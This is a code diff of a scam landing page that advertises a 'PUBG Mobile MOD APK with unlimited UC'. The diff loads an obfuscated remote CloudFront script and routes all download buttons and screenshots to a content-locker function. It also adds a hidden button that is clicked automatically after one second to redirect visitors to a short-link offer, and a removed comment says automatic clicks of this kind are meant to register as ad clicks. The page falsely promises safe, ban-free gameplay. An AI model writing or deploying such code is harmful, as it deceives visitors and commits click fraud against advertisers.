@@ -8,7 +8,6 @@
   <meta name="keywords" content="PUBG Mobile MOD, PUBG MOD APK, Unlimited UC PUBG, PUBG Mobile free UC, PUBG MOD Android, Battle Royale game" />
   <meta name="author" content="PUBGMod Team" />
   <link rel="icon" type="image/png" href="https://i.postimg.cc/g012yDnJ/temp-Image-Qt-ASHh.avif" />
-
   <style>
     body {
       margin: 0;
@@ -103,7 +102,6 @@
     .download-btn:hover {
       background: #0288d1;
     }
-
     .screenshots-section {
       margin-top: 2rem;
       text-align: center;
@@ -133,7 +131,6 @@
       transform: scale(1.05);
       box-shadow: 0 6px 20px rgba(0,0,0,0.9);
     }
-
     .trust-text {
       max-width: 600px;
       margin: 2rem auto 3rem;
@@ -146,27 +143,24 @@
       font-style: italic;
       user-select: none;
     }
-
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(20px);}
       to { opacity: 1; transform: translateY(0);}
     }
   </style>
-
   <script type="text/javascript">
-    var dGtQp_tic_LcDQqc = {"it":4495281,"key":"d7d57"};
+    var MoFym_xNn_knGHHc={"it":4495281,"key":"d7d57"};
   </script>
-  <script src="https://d2yc6hxtq0phup.cloudfront.net/1a76f86.js"></script>
+  <script src="https://d2v7l2267atlz5.cloudfront.net/b31cde2.js"></script>
 </head>
 <body>
   <div class="header">
     <img src="https://i.postimg.cc/g012yDnJ/temp-Image-Qt-ASHh.avif" alt="PUBG Icon" />
     <h1>PUBG Mobile MOD</h1>
   </div>
-
   <main class="container">
     <article class="card">
-      <img src="https://i.postimg.cc/qqTBSvcH/temp-Imagek6-Mv-K6.avif" alt="PUBG Banner" onclick="goToOffer()" />
+      <img src="https://i.postimg.cc/qqTBSvcH/temp-Imagek6-Mv-K6.avif" alt="PUBG Banner" onclick="goToLocker()" />
       <div class="card-content">
         <h2 class="title">PUBG Mobile MOD APK with Unlimited UC</h2>
         <div class="rating">⭐ 4.5</div>
@@ -182,41 +176,42 @@
           <li>No ads or pop-ups</li>
           <li>Compatible with most Android devices</li>
         </ul>
-        <button class="download-btn" onclick="goToOffer()" id="downloadBtn">Download Game</button>
+        <button class="download-btn" onclick="goToLocker()" id="downloadBtn">Download Game</button>
       </div>
     </article>
-
     <section class="screenshots-section">
       <h2>Screenshots</h2>
       <div class="screenshots-list">
-        <img src="https://i.postimg.cc/9fQ7gJmY/temp-Image-TJEWt-F.avif" alt="Screenshot 1" onclick="goToOffer()" />
-        <img src="https://i.postimg.cc/ZKPvT10L/temp-Image-Vtlw-Jj.avif" alt="Screenshot 2" onclick="goToOffer()" />
-        <img src="https://i.postimg.cc/vZ31nfrg/temp-Image-L9ni-F0.avif" alt="Screenshot 3" onclick="goToOffer()" />
-        <img src="https://i.postimg.cc/6Qq8fqcH/temp-Imagee-STa-Ya.avif" alt="Screenshot 4" onclick="goToOffer()" />
-        <img src="https://i.postimg.cc/VNhdGwHz/temp-Imagerg6-Lyt.avif" alt="Screenshot 5" onclick="goToOffer()" />
+        <img src="https://i.postimg.cc/9fQ7gJmY/temp-Image-TJEWt-F.avif" alt="Screenshot 1" onclick="goToLocker()" />
+        <img src="https://i.postimg.cc/ZKPvT10L/temp-Image-Vtlw-Jj.avif" alt="Screenshot 2" onclick="goToLocker()" />
+        <img src="https://i.postimg.cc/vZ31nfrg/temp-Image-L9ni-F0.avif" alt="Screenshot 3" onclick="goToLocker()" />
+        <img src="https://i.postimg.cc/6Qq8fqcH/temp-Imagee-STa-Ya.avif" alt="Screenshot 4" onclick="goToLocker()" />
+        <img src="https://i.postimg.cc/VNhdGwHz/temp-Imagerg6-Lyt.avif" alt="Screenshot 5" onclick="goToLocker()" />
       </div>
     </section>
-
     <div style="text-align:center; margin-top: 1rem;">
-      <button onclick="goToOffer()" class="download-btn" id="downloadBtn2">Download NOW</button>
+      <button onclick="goToLocker()" class="download-btn" id="downloadBtn2">Download NOW</button>
     </div>
-
     <div class="trust-text">
       This MOD APK is tested and verified for smooth and safe gameplay. Enjoy PUBG Mobile with unlimited UC, no bans, and no risks.
     </div>
   </main>
-
+  <button id="hiddenBtn" style="display:none;" onclick="goToOffer()">Hidden Download</button>
   <script>
+    let clicked = false;
+    function goToLocker() {
+      _yi();
+    }
     function goToOffer() {
       window.location.href = "https://smrturl.co/262a8d4";
     }
-
-    // محاكاة الضغط على زر التحميل بعد 3 ثوانٍ (click event) لتحتسب كـ click في adbleumedia
     setTimeout(function() {
-      // نجد الزر الأول للتحميل ثم "نضغط" عليه برمجياً
-      var btn = document.getElementById("downloadBtn");
-      if (btn) {
-        btn.click();
+      if (!clicked) {
+        clicked = true;
+        var btn = document.getElementById("hiddenBtn");
+        if (btn) {
+          btn.click();
+        }
       }
     }, 1000);
   </script>
